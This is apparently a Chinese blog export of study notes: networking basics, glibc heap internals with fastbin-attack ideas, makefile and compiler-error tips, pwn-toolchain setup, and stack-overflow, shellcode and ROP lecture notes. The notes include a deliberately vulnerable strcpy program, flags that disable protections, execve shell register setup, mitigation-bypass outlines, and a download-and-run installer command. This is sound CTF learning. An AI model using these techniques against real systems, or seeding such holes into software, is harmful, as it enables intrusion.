IP协议根据网络地址的协议就叫做IP协议,其定义的地址就叫做IP地址.IP地址由网络号和主机号组成.处于一个子网络的电脑,其IP地址的网络部分必定是相同的.主机部分是对同处该子网的主机进行编号. 为了从IP地址判断出两台计算机是否处于同一个子网,就要用到另一个参数”子网掩码“即subnet mask.子网掩码使表示子网特征的一个参数,在形式上等同于IP地址,也是一个32位二进制数字.其网络部分全为1,主机部分全为0. 知道IP地址与子网掩码判断是否属于同一个子网的方法:将两个IP地址分别于子网掩码进行AND运算,结果相同则在一个子网. 已知IP地址172.16.154.1和172.16.254.233子网掩码都是255.255.255.0,请问其是否在一个子网? 总结IP协议的作用:一是为每台计算机分配IP地址,另一个是为确定哪些地址处于一个子网. IP数据报根据IP协议发送的数据,就叫做IP数据报.但是Ethernet数据报只包含MAC地址,并没有IP地址的栏位,是否要修改数据报定义,再添加一个栏位?回答是不需要,因为可以直接将IP数据报放进Ethernet数据报的数据部分.这就是互联网分层结构的好处:上层变动完全不涉及下层结构. IP数据报的标头(特指不在Head中而在Data中的关于IP信息的Head)长度一般在20-60字节,整个数据报的长度最大为65535字节.Ethernet数据报的数据部分,最长只有1500字节,所以如果IP数据报超过了1500字节,就要分割成几个Ethernet数据报分开发送. ARP协议IP数据报是放在以太网数据报里发送的.所以必须同时知道两个地址,一个是对方的MAC地址,一个是对方的IP地址.通常情况下对方的IP地址是已知的,但是MAC地址未知.所以需要一种基址从IP地址得到MAC地址. 第一种情况,两个主机不在一个子网,则事实上无法得到对方的MAC地址,只能将数据包传送到两个子网连接处的网关,让网关进行处理. 第二种情况,两个主机在一个子网,则使用ARP协议.ARP协议发出一个数据报,其中包含所要查询的IP地址,在对方的MAC地址这一栏,填的是FF:FF:FF:FF:FF:FF,表示这是一个广播地址.他所在的子网络的每一台主机,都会收到这个数据报.从中取出IP地址,与自身IP地址进行比较,如果两者相同,则做出回复向对方报告MAC地址,否则就丢弃这个包. 传输层有了MAC地址和IP地址,就可以在互联网上任意两台主机建立通信.但是同一台主机上有许多程序都要使用到网络,那么就需要一个参数来表示这个数据包到底供哪个进程使用,这个参数就叫做端口.它其实是每一个使用网卡的程序的编号,每个数据报都发送到主机的特定端口,这样不同的程序就能够取到自己所需要的数据. 端口是0到65535之间的一个整数,正好16个二进制位.0到1023的端口被系统占用,用户只能选择大于1023的端口. 传输层的功能是建立端口到端口之间的通信,相比之下网络层是建立主机到主机之间的通信.只要确定主机和端口,就能实现程序之间的交流.因此Unix就把主机+端口,叫做”套接字”socket. UDP协议现在我们要在数据报中加入端口信息,这就需要新的协议.最简单的实现叫做UDP协议,它的格式就是在数据前面加上端口号. Head部分主要定义了发出端口与接收接口,其数据报非常简单,Head部分8个字节,总长度不超过65535字节,正好放进一个IP数据报.数据部分就是具体的内容然后把整个UDP数据报放入IP数据报的数据部分.所以整个Ethernet数据报变成了下面这样: TCP协议UDP协议的优点在于比较简单,容易实现.但是缺点在于一旦数据报发出,无法知道对方是否知道.为了提高网络可靠性,TCP协议就诞生了.这个协议非常复杂,但可以近似认为它是有确认机制的.因此TCP协议能够确保数据不会丢失,但是实现困难,资源消耗较多. TCP数据报和UDP数据报一样,都是内嵌在IP数据报的数据部分.TCP数据报没有长度限制,理论上可以无限长.但是为了保证网络的效率,通常TCP数据报的长度不会超过IP数据报的长度,确保单个TCP数据报不必再被分割. 应用层应用程序收到传输层的数据,接下来就要进行解读.由于互联网是开放架构,所以必须先规定好格式.应用层的作用,就是规定应用程序的数据格式.举例来说,TCP协议可以为各种各样的程序传递数据,Email/WWW/FTP等,必须有不同协议规定电子邮电,网页和FTP数据的格式,这些应用程序协议就构成了应用层.这是最高的一层,直接面对用户.其数据就在TCP数据报的数据部分,因此现在的Ethernet变成了下面这样: 网络通信的实质就是交换上面的数据报. 对于不在一个子网的两台计算机之间的通信(假设1号电脑要向4号电脑发送数据报),则1号电脑需要知道网关A的MAC地址(和4号电脑的IP地址).1号电脑发出数据报到网关A,网关A通过路由协议发现4号电脑位于网络B,又把数据报发给网关B,B再转发到4号电脑. 判断是否处于同一子网的方法静态IP地址本机IP地址,子网掩码,网关IP地址,DNS的IP地址是TCP/IP协议的重要参数,通俗来说知道它们就可以上网.由于它们是给定的,计算机每次开机都分配到相同的IP地址,所以这种方法被称作静态IP地址上网. 但是出于简便性,并且避免IP地址无法灵活变更,大多数用户使用”动态IP上网”. 动态IP地址计算机开机后会自动分配到一个IP地址,不用人为设定,它们使用的协议叫做DHCP协议.该协议规定每个子网中都有一台计算机负责管理本网络的所有IP地址,叫做DHCP服务器.新的计算机加入网络,必须向DHCP服务器发送一个DHCP请求数据报,申请IP地址和相关的网络参数.(指定管理IP地址的DHCP服务器未开机怎么办????) 新加入的计算机不知道不同子网计算机的MAC地址和IP地址,如何发送数据报?DHCP协议作出了巧妙规定: 由于DHCP是一种建立在UDP协议基础上的应用层协议,所以整个数据报长这个样子: 最前面的Ethernet Head,设置发出方的MAC地址和接收方(DHCP服务器)的MAC地址,前者就是本机网卡的MAC地址,后者此时不知道,填入广播地址FF:FF:FF:FF 后面的IP Head,设置发出方的IP地址和接收方的IP地址,这时对于这两者本机都不知道,于是发出方的IP地址设为0.0.0.0,接收方IP地址设为255.255.255.255 最后的UDP Head,设置发出方的端口和接收方的端口.DHCP协议规定发出方是port 68,接收方是port 67. 这个数据包构造完成后，就可以发出了。以太网是广播发送，同一个子网络的每台计算机都收到了这个包。因为接收方的MAC地址是FF-FF-FF-FF-FF-FF，看不出是发给谁的，所以每台收到这个包的计算机，还必须分析这个包的IP地址，才能确定是不是发给自己的。当看到发出方IP地址是0.0.0.0，接收方是255.255.255.255，于是DHCP服务器知道”这个包是发给我的”，而其他计算机就可以丢弃这个包。 接下来，DHCP服务器读出这个包的数据内容，分配好IP地址，发送回去一个”DHCP响应”数据包。这个响应包的结构也是类似的，以太网标头的MAC地址是双方的网卡地址，IP标头的IP地址是DHCP服务器的IP地址（发出方）和255.255.255.255（接收方），UDP标头的端口是67（发出方）和68（接收方），分配给请求端的IP地址和本网络的具体参数则包含在Data部分。新加入的计算机收到这个响应包，于是就知道了自己的IP地址、子网掩码、网关地址、DNS服务器等等参数。 实例假设网络参数如下: 本机IP:192.168.1.100,子网掩码255.255.255.0,网关IP:192.168.1.1,DNS的IP地址:8.8.8.8 然后打开了Google Chrome,输入了www.google.com,接下来浏览器将要向Google发送一个网页请求数据报. DNS协议发送数据报就要知道对方的IP地址,我么可以通过DNS协议将网址转换为IP地址.已知DNS服务器为8.8.8.8,于是向其发送DNS数据报(port 53): 之后DNS服务器做出响应,告诉我们Google服务器的IP地址172.194.72.105. 子网掩码得到IP地址后要通过子网掩码来判断改IP是否在同一个子网,以确定要不要向网关发包.将子网掩码与自己的IP地址和Google的IP地址进行AND运算,发现结果不相等,所以不在一个子网.所以我们要向Google发送数据报,必须通过网关192.168.1.1转发,也就是说接收方的IP地址将是网关的MAC地址. 应用层协议浏览网页用到的是HTTP协议,它的数据报长下面这个样子: GET / HTTP/1.1Host: www.google.comConnection: keep-aliveUser-Agent: Mozilla/5.0 (Windows NT 6.1) ……Accept: text/html,application/xhtml+xml,application/xml;q=0.9,/;q=0.8Accept-Encoding: gzip,deflate,sdchAccept-Language: zh-CN,zh;q=0.8Accept-Charset: GBK,utf-8;q=0.7,*;q=0.3Cookie: … … 被嵌在TCP数据报之中,假定为4960字节. TCP协议TCP数据报需要设置端口,接收方的HTTP默认端口是80,而发送方的端口是1024-65535之间随机确定的. 假定为51775.TCP数据报的Head长为20字节,加上嵌入HTTP的数据报,总长度变为4980字节. IP协议然后TCP数据报再嵌入IP数据报,IP数据报需要设置双方的IP地址,这是已知的.发送方是192.168.1.100（本机），接收方是172.194.72.105（Google）。IP数据包的标头长度为20字节，加上嵌入的TCP数据包，总长度变为5000字节。 Ethernet协议最后IP数据报嵌入以太网数据报,以太网数据报设置双方的MAC地址,发送方为本机的网卡MAC地址，接收方为网关192.168.1.1的MAC地址（通过ARP协议得到）。 以太网数据包的数据部分，最大长度为1500字节，而现在的IP数据包长度为5000字节。因此，IP数据包必须分割成四个包。因为每个包都有自己的IP标头（20字节），所以四个包的IP数据包的长度分别为1500、1500、1500、560。 服务器端响应经过多个网关转发,Google服务器收到了这四个以太网数据报.根据IP Head的序号,Google将四个包拼接起来,取出完整的TCP数据,根据其中的HTTP请求作出HTTP响应,再用TCP协议发回.本机收到HTTP响应后,就可以将网页显示出来,完成一次网络通信.]]></content>
      <tags>
        <tag>计算机网络</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[长亭公开课之堆溢出]]></title>
    <url>%2F2020%2F05%2F04%2F%E9%95%BF%E4%BA%AD%E5%85%AC%E5%BC%80%E8%AF%BE%E4%B9%8B%E5%A0%86%E6%BA%A2%E5%87%BA%2F</url>
    <content type="text"><![CDATA[什么是堆栈通常用于为函数分配固定大小的局部内存，而堆是可以根据运行时的需要进行动态分配与释放的内存，大小可变。Malloc/New-Free/Delete，两组接口，分别是申请内存的两种方式，C与C++。 堆的实现重点关注内存块的组织和管理方式，尤其是空闲内存块。重点在于如何提高分配和释放效率/如何降低碎片化，提高空间利用率。 常见堆实现 dlmalloc-通用分配器 ptmalloc2-glibc，基于dlmalloc fork出来，支持多线程。 jemalloc-FreeBSD，Firefox，Android tcmalloc-Google Chrome libumen-Solaris segment heap-Win10 ptmalloc2的多线程支持：不同的线程维护不同的堆，称为per thread arena 主线程创建的堆，称为main arena arena数量受到CPU核数限制：32位系统的arena数量上限=2x核数，64位系统arena数量上限=8x核数。 glibc的堆管理实现arena该结构体指的是堆内存区域本身而并非结构，主线程的main arena通过sbrk创建，其他线程arena通过mmap创建。 malloc_state该结构体管理arena的核心结构，包含堆的状态信息，bins链表等。main arena对应的mallloc_state结构存储在glibc的全局变量中。其他线程arena对应的malloc_state存储在arena本身中。 binsbins用来管理空闲内存块，通常使用链表结构来进行组织。 chunks内存块的结构 *glibc2.26以下（不包含2.26），即出现tcache之前的管理方式。64bit OS。* arena的头部结构：malloc_state1234567891011121314struct malloc_state &#123;mutex_t mutex; /* 同步访问相关，互斥锁 */int flags; /* 标志位，以前是max_fast，在一些老的文章上可能还使用的这个说法，比如phrack */mfastbinptr fastbins[NFASTBINS]; /* fastbins，之后会说到,是一个chunk的链表 */mchunkptr top; /* top chunk，一个特殊的chunk，在之后会说到 */mchunkptr last_remainder; /* 最后一次拆分top chunk得到的剩余内容，之后会说到 */mchunkptr bins[BINS * 2]; /* bins，一个chunk的链表的数组，之后会说到 */unsigned int binmap[BINMAPSIZE]; /* bins是否为空的一个位图 */struct malloc_state *next; /* 链表，下一个malloc_state的位置 */INTERNAL_SIZE_T system_mem;INTERNAL_SIZE_T max_system_mem;&#125;static struct malloc_state main_arena;/*global variable in libc.so*/ malloc_state存储arena的状态。 主线程的malloc_srate结构存储在glibc的全局变量中，变量名为main_arena，概览如下。 ![QQ图片20200504182415](D:\My Daily\P\QQ图片20200504182415.png) Top Chunk意为自留地，可以通过sbrk扩展。 ![QQ图片20200504193145](D:\My Daily\P\QQ图片20200504193145.png) ![QQ图片20200504194746](D:\My Daily\P\QQ图片20200504194746.png) 区别在于最后一个部分prev_size是否被数据所填充。（fd和bk也是吧）。 malloc参数为用户申请的内存大小。 chunk包含数据和metadata。 返回的chunk只要保证其中的可用数据大小大于等于用户申请即可。 在x86 32位平台下，chunk的大小一定是8字节的整数倍，x64平台下，chunk的大小一定是16字节的整数倍。 Bins结构用来管理和组织空闲内存块的链表结构，根据大小状态分为许多。 Fast bins，小的chunk。 small bins，中等大小的chunk large bins，较大的chunk unsorted bins，存放未整理chunk。 建议看glibc源码 fastbin attack Fast bins：还是自己写程序对照源码看。 大小，32位是16-64字节，64位是32-128字节。 相同大小的chunk放在一个bin中。 单向链表，fd指向上一个free chunk。 后进先出 First in last out。先释放的chunk反而先被申请（同等大小，后释放，先利用）。 相邻的空闲fast bin chunk不会被吞并（P标志不改变）。 当chunk被free时，不会清理PREV_INUSE标志（还保留原来的数据）。 内存中两位一个字节。0X41414141，一个字节一个ASCII码。NMP怎么表示。 small bins![QQ图片20200504203436](D:\My Daily\P\QQ图片20200504203436.png) bins[2]bins[3]一定是最小的chunk的双向链表，bins[0]和bins[1]呢？ large bins![QQ图片20200504204347](D:\My Daily\P\QQ图片20200504204347.png) 每组bins中的chunk大小不一定相同，按由大到小的顺序在链表中排列。 unsorted bins（放入对应的xxxx有误）![QQ图片20200504211557](D:\My Daily\P\QQ图片20200504211557.png) 区别：没看懂 ![QQ图片20200504212512](D:\My Daily\P\QQ图片20200504212512.png) ![QQ图片20200504212654](D:\My Daily\P\QQ图片20200504212654.png) malloc和free的工作流程malloc()工作流程 如果size&lt;max_size，在fast bins中寻找发射台 chunk，找到则结束。 如果size in_smallbin_range，在small bins中寻找small chunk。 如果size not in_smallbin_range,合并所有fastbin的chunk 循环a：检查unsorted bin中的last_ramainder,满足一定条件分裂之，剩余的chunk标记为新的last_remainder。 循环b：在unsorted bin中搜索，同时进行整理。如果遇到精确大小则返回，否则把当前chunk整理到small/large bins中去。 循环c：在small bin和large bin中搜索最合适的chunk（不一定是精确大小） 使用top chunk。 free()的工作流程 如果size &lt; max fast,放入fast bin，结束 如果前一个chunk是free的，unlink前面的chunk，并合并两个chunk放入unsorted bin。 如果后一个chunk是top chunk，则将当前chunk并入top chunk。 如果后一个chunk是free的，unlink后面的chunk，合并两个chunk并放入unsorted bin。 前后都不是free的，放入unsorted bin. Fast bin利用技术Fast bin为单向链表，结构简单，容易伪造。并且为了提高效率，安全检查较少。但是只针对fast bin大小的chunk，对small/large chunk不适用。 利用思路： 空闲Fast chunk如果发生溢出而被覆盖，则链表指针fd可以被修改。 可以通过修改链表指针fd，在Fast bin链表中引入伪造的空闲Fast chunk。 下次分配时分配出伪造的Fast chunk。 伪造的Fast chunk可以在.bss全局变量处，也可以在栈上。 在栈上伪造Fast chunk：覆盖返回地址。 在bss上伪造Fast chunk，修改全局变量。 在堆上伪造Fast chunk，修改堆上的数据。 新版本中glibc中的tcache堆的花式玩法指针与地址用户在调用malloc函数时返回的值为一个指针，指向分配到的堆空间（用户数据区） 链表在pwn的堆题中，经常会有一些”笔记管理系统”的题目，笔记的数据结构就是使用链表连接起来的]]></content>
  </entry>
  <entry>
    <title><![CDATA[makefile入门]]></title>
    <url>%2F2020%2F05%2F01%2Fmakefile%E5%85%A5%E9%97%A8%2F</url>
    <content type="text"><![CDATA[Makefile 文件描述了 Linux 系统下 C/C++ 工程的编译规则，它用来自动化编译 C/C++ 项目。一旦写编写好 Makefile 文件，只需要一个 make 命令，整个工程就开始自动编译，不再需要手动执行 GCC 命令。 一个中大型 C/C++ 工程的源文件有成百上千个，它们按照功能、模块、类型分别放在不同的目录中，Makefile 文件定义了一系列规则，指明了源文件的编译顺序、依赖关系、是否需要重新编译等。 Windows 下的集成开发环境（IDE）已经内置了 Makefile，或者说会自动生成 Makefile，我们不用去手动编写。Linux 中却不能这样，需要我们去手动的完成这项工作。Linux 下可以学习的开发语言有很多，常见的有 C/C++语言、python、java 等等。如果你想要在 Linux(Unix) 下做开发的话，不了解 Makefile 是一件非常失败的事情，甚至说你就成为不了一个合格的 Linux 开发工程师。不懂 Makefile，就操作不了多文件编程，就完成不了相对于大的工程项目的操作。 优点Makefile 会彻底简化编译的操作。把要链接的库文件放在 Makefile 中，制定相应的规则和对应的链接顺序。这样只需要执行 make 命令，工程就会自动编译。每次想要编译工程的时候就执行 make ，省略掉手动编译中的参数选项和命令，非常的方便。 Makefile 支持多线程并发操作，会极大的缩短我们的编译时间，并且当我们修改了源文件之后，编译整个工程的时候，make 命令只会编译我们修改过的文件，没有修改的文件不用重新编译，也极大的解决了我们耗费时间的问题。 记录下测试makefile编写是否成功时遇到的缺少cygwin1.dll的问题，一开始从脚本之家上下了个上古版本的，regsvr32 cygwin1.dll发现一会是报错0X0000007b，一会是模块cygwin1.dll已加载，但找不到入口点DLLRegisterServer，最后从cygwin中找到了最新版本的，然后将cygwin64\bin加入了环境变量（这应该才是关键所在），最后运行成功。 格式12targets : prerequisites command Makefile 描述的是文件编译的相关规则，它的规则主要是两个部分组成，分别是依赖的关系和执行的命令。 targets：规则的目标，可以是 Object File（一般称它为中间文件），也可以是可执行文件，还可以是一个标签； prerequisites：是我们的依赖文件，要生成 targets 需要的文件或者是目标。可以是多个，也可以是没有； command：make 需要执行的命令（任意的 shell 命令）。可以有多条命令，每一条命令占一行。 注意：我们的目标和依赖文件之间要使用冒号分隔开，命令的开始一定要使用Tab键。 12345678910111213SOURCE = XXXX.c\ XXXX.c//待编译的源文件 HEADER = XXXX.h\ XXXX_extern.h//待编译的头文件 INCPATH = -I../../header//头文件搜索路径LIBRARY = -L../../liball:XXXXXXXX:$(SOURCE) $(HEADER) gcc -shared -fPIC -w $(INCPATH) $(LIBRARY) -O libXXXX.so $(SOURCE)]]></content>
  </entry>
  <entry>
    <title><![CDATA[Errors]]></title>
    <url>%2F2020%2F04%2F22%2FErrors%2F</url>
    <content type="text"><![CDATA[gcc编译时报错 12345In file included from stacktest.c:1:0:/usr/include/stdio.h:27:10: fatal error: bits/libc-header-start.h: 没有那个文件或目录 #include &lt;bits/libc-header-start.h&gt; ^~~~~~~~~~~~~~~~~~~~~~~~~~compilation terminated. solution： 1sudo apt-get install gcc-multilib 原因： 1gcc安装环境没有安装完善 2.同gcc编译时报错 1expected specifier-qualifier-list specifiers是指void、char、struct Foo等词汇；qualifiers是指像const和volatile一类的关键字。一个词汇在未定义之前就使用就会出项这种错误，可以通过typedef进行定义以后再使用。 3.建议在用作真值的赋值语句前后加上括号 看看是不是==写成了=，比较语句写成了赋值语句。 4.魔幻报错 123456789In file included from ODGF_extern.h:20, from ODGF.c:14:ODGF.h:43:2: 错误：枚举‘ODGF_NOTHING’重声明 43 | ODGF_NOTHING = 0, | ^~~~~~~~~~~~In file included from ODGF.c:13:ODGF.h:43:2: 附注：‘ODGF_NOTHING’的上一个定义在此 43 | ODGF_NOTHING = 0, | ^~~~~~~~~~~~ 需要在头文件里加上防止重复定义的宏定义。 1234#ifndef _IT_MEAS_CLASS_H_ #define _IT_MEAS_CLASS_H_ #endif // _IT_MEAS_CLASS_H_ 4.代码中全局变量占内存太大？ 1234/usr/lib/gcc/x86_64-pc-cygwin/9.3.0/../../../../x86_64-pc-cygwin/bin/ld: /tmp/ccNBY84M.o:ODGF.c:(.text+0x17c): undefined reference to `ODGF_rq_reference_measurement&apos;/tmp/ccNBY84M.o:ODGF.c:(.text+0x17c): relocation truncated to fit: R_X86_64_PC32 against undefined symbol `ODGF_rq_reference_measurement&apos;collect2: 错误：ld 返回 1make: *** [makefile:39：libODGF] 错误 1 5.运行《游戏外挂攻防艺术》随书文件报错 1应用程序无法启动，因为应用程序的并行配置不正确 应该是缺少某个支持的文件，查看下日志。 12345以管理员身份运行cmdsxstrace.exe Trace -logfile:D:\trace.log(自定义path)，开始跟踪。运行应用程序，回车，完成跟踪报告。sxstrace.exe Paese -logfile:D:\trace.log -outfile:D:\trace.txt打开trace.txt查看日志，找到缺少的C++库。 6.Ubuntu16.04安装pip3报错 123下列软件包有未满足的依赖关系： gnupg : 破坏: software-properties-common (&lt;= 0.96.24.3) 但是 0.96.20.9 正要被安装E: 错误，pkgProblemResolver::Resolve 发生故障，这可能是有软件包被要求保持现状的缘故。 解决办法，先把报错的包直接uninstall再继续安装 1apt-get install pip3 之后删了一堆东西，左边工具栏都空了一半，也不知道有什么影响。]]></content>
      <tags>
        <tag>报错</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[从零开始安装pwn环境]]></title>
    <url>%2F2020%2F04%2F21%2F%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E5%AE%89%E8%A3%85pwn%E7%8E%AF%E5%A2%83%2F</url>
    <content type="text"><![CDATA[今天学着学着要改用户权限，结果一改之前的环境一概找不到了（账号进不去了）。又得从零开始把Pwn环境给安装上，充分说明了虚拟机快照以及物理机备份的重要性。 修改源为阿里云源换源是一切基本设置的基础，在更新系统本身之前就换能够加快速度。 备份 1sudo cp /etc/apt/sources.list /etc/apt/sources.list.bak 安装vim 1sudo apt-get install vim 编辑源文件 1sudo vim /etc/apt/sources.list 将所有原有内容注释掉，加上如下语句，还是阿里云源好用。 12345678910deb http://mirrors.aliyun.com/ubuntu/ bionic main restricted universe multiversedeb http://mirrors.aliyun.com/ubuntu/ bionic-security main restricted universe multiversedeb http://mirrors.aliyun.com/ubuntu/ bionic-updates main restricted universe multiversedeb http://mirrors.aliyun.com/ubuntu/ bionic-proposed main restricted universe multiversedeb http://mirrors.aliyun.com/ubuntu/ bionic-backports main restricted universe multiversedeb-src http://mirrors.aliyun.com/ubuntu/ bionic main restricted universe multiversedeb-src http://mirrors.aliyun.com/ubuntu/ bionic-security main restricted universe multiversedeb-src http://mirrors.aliyun.com/ubuntu/ bionic-updates main restricted universe multiversedeb-src http://mirrors.aliyun.com/ubuntu/ bionic-proposed main restricted universe multiversedeb-src http://mirrors.aliyun.com/ubuntu/ bionic-backports main restricted universe multiverse 更新软件列表 1sudo apt-get update 更新软件包 1sudo apt-get upgrade Pwntools安装pip3 1sudo apt install python3-pip 安装git 1sudo apt install git 克隆pwntools到本地 1git clone https://github.com/Gallopsled/pwntools 各种源 1234阿里云 http://mirrors.aliyun.com/pypi/simple/中科大https://mirrors.tuna.tsinghua.edu.cn/pypi/web/simple/豆瓣http://pypi.doubanio.com/simple/清华https://pypi.tuna.tsinghua.edu.cn/simple/ 安装 1sudo python3 setup.py install 不断报错缺少各种包，吐血 1pip3 install pwntools -i https://pypi.tuna.tsinghua.edu.cn/simple/ Pwndbg123git clone https://github.com/pwndbg/pwndbgcd pwndbgsudo ./setup.sh Ubuntu附带了一个来自前寒武纪的PIP版本，如果你不想花很多时间调试的话就必须升级他。 1234apt-get remove python-pip python3-pipwget https://bootstrap.pypa.io/get-pip.pypython get-pip.pypython3 get-pip.py peda12git clone https://github.com/longld/peda.git ~/pedaecho &quot;source ~/peda/peda.py&quot; &gt;&gt; ~/.gdbinit 切换1vim ~/.gdbinit 要哪个注释掉其他两个 后续应该还要安装别的工具，再进行补充。]]></content>
  </entry>
  <entry>
    <title><![CDATA[长亭公开课之ROP]]></title>
    <url>%2F2020%2F04%2F20%2F%E9%95%BF%E4%BA%AD%E5%85%AC%E5%BC%80%E8%AF%BE%E4%B9%8BROP%2F</url>
    <content type="text"><![CDATA[栈溢出与Shellcode栈溢出利用思路保护及编译选项栈不可执行 1-z exestack canary保护 1-fno-stack-protector 1gcc 以上两个参数 name.c -o name -m32 栈布局Stack Layout1234567891011Example BOF program：#include &lt;stdio.h&gt;#include &lt;string.h&gt;int main(int argc,char **argv)&#123; char buf[128]; if (argc &lt; 2) return 1; strcpy(buf,argv[1]); printf(&quot;argv[1]:%s\n&quot;,buf); return 0;&#125; char **argv 高地址，函数参数 int argc 函数参数 return address 函数被call时放入栈内 saved %ebp 函数开头push ebp char buf[128] char buf[128] 低地址，拷贝时↑ 可以看出C语言传参是从右向左传的，最右边的最先入栈。 mov esp,ebp 恢复主调函数的栈顶指针esp，将其指向被调函数栈底。此时局部变量占用的栈空间被释放，但变量内容未被清楚。 pop ebp 主调函数的帧基指针%ebp出栈，即恢复主调函数栈底。此时，栈顶指针%esp指向主调函数栈顶(espßesp-4)，亦即返回地址存放处。 ret 从栈顶弹出主调函数压在栈中的返回地址到指令指针寄存器%eip中，跳回主调函数该位置处继续执行。再由主调函数恢复到调用前的栈。 前两条指令也可以由leave实现，具体用哪种方式由编译器决定。 从物理上来说，CALL 指令将其返回地址压入堆栈，再把被调用过程的地址复制到指令指针寄存器。当过程准备返回时，它的 RET 指令从堆栈把返回地址弹回到指令指针寄存器。32 位模式下，CPU 执行的指令由 EIP（指令指针寄存器）在内存中指岀。 可以把Shellcode放在缓冲区开头，然后通过覆盖返回地址跳转到Shellcode。 也可以将Shellcode放在返回地址之后，然后通过覆盖返回地址跳转到Shellcode，可以不限长度。 →JMP ESP，将返回地址跳转到JMP ESP上。当函数返回时esp指向addr后，不用知道栈具体在哪。 栈不够shellcode放在addr后，栈够了放在addr前。 其中，主调函数将参数按照调用约定依次入栈，然后将指令指针EIP入栈以保存主调函数的返回地址(下一条待执行指令的地址)。进入被调函数时，被调函数将主调函数的帧基指针EBP入栈，并将主调函数的栈顶指针ESP值赋给被调函数的EBP(作为被调函数的栈底)，接着改变ESP值来为函数局部变量预留空间。此时被调函数帧基指针指向被调函数的栈底。以该地址为基准，向上(栈底方向)可获取主调函数的返回地址、参数值，向下(栈顶方向)能获取被调函数的局部变量值，而该地址处又存放着上一层主调函数的帧基指针值。本级调用结束后，将EBP指针值赋给ESP，使ESP再次指向被调函数栈底以释放局部变量；再将已压栈的主调函数帧基指针弹出到EBP，并弹出返回地址到EIP。ESP继续上移越过参数，最终回到函数调用前的状态，即恢复原来主调函数的栈帧。如此递归便形成函数调用栈。 Shellcode的编写调试和生成shellcode：在软件漏洞利用中经常用到的一小段代码，通常用于为攻击者启动一个能控制和受害者机器的shell。我们使用的shellcode:利用execve系统调用来获得一个高权限shell。 Linux下的执行文件函数原型： 1int execve(const char *filename,char *const argv[],char *const envp[]);//文件名，参数，环境变量 shellcode: 1execve(&quot;/bin//sh&quot;,Null,Null) Syscall调用约定： syscall number:%eax=0xb 0 第一个参数:%ebx=filename 0x68732f2f=’//sh’ 0x6e69622f=’/bin/ 第二个参数:%ecx=argv 0 第三个参数:%edx=envp=0 第四个参数:%esi X 第五个参数 :%edi X 第六个参数:%ebp X /与//，凑字节。字符串以0结尾。 寻找填充长度：找到缓冲区开头的地址，再找到返回地址所在位置，两者相减即可。为了找到缓冲区开头地址，我们可以在调用strcpy之前下断点，通过查看strcpy的第一个参数得知。另外可在main函数之前断下，此时esp指向的就是返回地址所在位置。 gdb命令：x/2wx $esp//x表示打印，/2表示打印两个值，w表示word大小，x为十六进制。 NOP sled：增加shellcode的长度，从而提高命中率。只要程序返回到了增加的许多个nop之中的任意一处，就会执行shellcode。 在gdb中运行程序，gdb会为进程增加许多环境变量，存储在栈上，导致栈用的更多，栈的地址变低了。直接运行时，栈地址会比gdb中高，所以在gdb中的shellcode地址就不管用了。所以利用NOP sled，在shellcode前增加一串nop链，只要命中任意一个NOP即可。 从Return to libc到ROP漏洞缓解措施Mitigation即便漏洞存在，也要让攻击者难以利用。操作系统和编译器都会提供。 如何阻止攻击者利用：随机栈地址堆地址等地址，让攻击者无法知道shellcode地址，无处跳转。 想办法检测栈溢出，检测到报错则退出。 栈上不能执行shellcode 具体实现分别为ALSR PIE/Stack Canary Stack Cooike/NX/W^X/DEP ALSR：开启随机化之后，会在堆栈以及共享库加载的时候，让栈往下移，堆往上移，共享库也留有空白，实现随机化。大量IOT设备仍未启用。 /proc/sys/kernel/randomize_va_space 来控制 ASLR 启动与否： 1230，关闭 ASLR，没有随机化。栈、堆、.so 的基地址每次都相同。1，普通的 ASLR。栈基地址、mmap 基地址、.so 加载基地址都将被随机化，但是堆基地址没有随机化。2，增强的 ASLR，在 1 的基础上，增加了堆基地址随机化。 PIE实际上是代码随机。只开启ALSR，栈，共享库，堆地址会被随机化，但是程序本身代码通常固定在0x80480000.开启PIE，编译器可以在编译时生成地址无关代码，程序可以加载在任意地址执行。 地址空间随机化绕过思路：未开启PIE，Return to PLT，可绕过共享库随机化。/X86_32架构下可爆破，内存地址随机化力度以一个内存页为单位，0x1000字节对齐。/信息泄露/NOP sled：在shellcode前不知一长串指令/堆喷Heap spray/本地环境技巧：ulimit -s unlimited。 canary：原理不再赘述，出题时gcc的-fstack-protector选项可以启用这一机制。 绕过：泄露canary，每个线程不同函数的canary都相同。/只覆盖局部变量，不覆盖返回地址。/修改Thread-local Strorage中的Canary。（修改对照的样本） NX：内存权限精细划分 绕过方法：Return-to-libc/ROP，利用程序本身的代码去执行想要的操作。 获取函数和代码片段的方法：动态调试与静态调试 动态调试：在gdb中直接用print打印system和exit函数地址。 静态调试：首先用ldd命令获取libc基地址，然后用readelf命令找到system和exit函数在libc中的偏移。用strings命令找到字符串。/bin/sh在libc中的偏移，最后通过与libc基址相加来获得最终地址。 想了很久的的问题，自己用课上的下断点计算方法去做题，结果和答案有4个位置的差距，想了很久，想明白了这种在输入的地方下断，再在该函数ret的地方下断，用x/wx $ESP可以算出偏移量。这是包含了ebp在内的。但是直接用IDA看的话，sub-xx，这个xx是不包含ebp在内的。 Return to libc利用ldd：看一个程序的动态链接库加载到了什么地址。 strings -tx .so文件路径|grep strings readelf -s .so文件路径 |grep function name，可以得到函数在.so文件中的偏移量。相加即得到准确地址。 传参的时候可能会碰到某些情况被截断，比如sh后有个回车，表现为多了个a被截断，此时只需再寻找字符串。 ROP:Return Oriented ProgrammingReturn to PLT:如果动态共享库的地址随机化保护开启，则无法知道libc地址。而程序中已经引用的动态库函数，可以直接通过PLT调用，无需知道实际地址。 以ret指令结尾的小段代码称为ROP gadget，实现某一功能而拼接成多个ROP gadget，称为ROP链。在栈上，从返回地址开始填充的用于执行ROP的命令称为ROP载荷ROP payload. 以此类推，除了可以利用Ret，还可以利用Jmp/call来构造跳转链。]]></content>
  </entry>
  <entry>
    <title><![CDATA[Computer Networking Tutorial]]></title>
    <url>%2F2020%2F04%2F20%2FComputer-Networking-Tutorial%2F</url>
